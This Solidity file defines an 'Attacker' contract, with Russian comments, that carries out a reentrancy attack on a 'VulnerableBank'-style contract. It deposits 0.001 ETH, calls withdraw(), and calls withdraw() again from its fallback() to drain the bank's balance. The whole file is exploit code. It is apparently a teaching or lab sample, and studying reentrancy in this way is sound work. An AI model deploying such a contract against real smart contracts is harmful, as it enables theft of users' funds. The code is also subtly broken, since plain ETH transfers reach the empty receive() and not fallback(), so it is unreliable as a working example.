// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

contract Attacker {
    IVulnerableBank public bank;
    uint256 public constant AMOUNT = 0.001 ether;

    constructor(address _bank) {
        bank = IVulnerableBank(_bank);
    }

    // Вызывается при получении эфира без данных (data == 0)
    receive() external payable {
        // можно оставить пустым или вызывать withdraw() — но лучше через fallback()
    }

    // Вызывается при получении эфира с data или если receive отсутствует
    fallback() external payable {
        if (address(bank).balance >= AMOUNT) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT, "Need at least 0.001 ETH");
        bank.deposit{value: AMOUNT}();
        bank.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
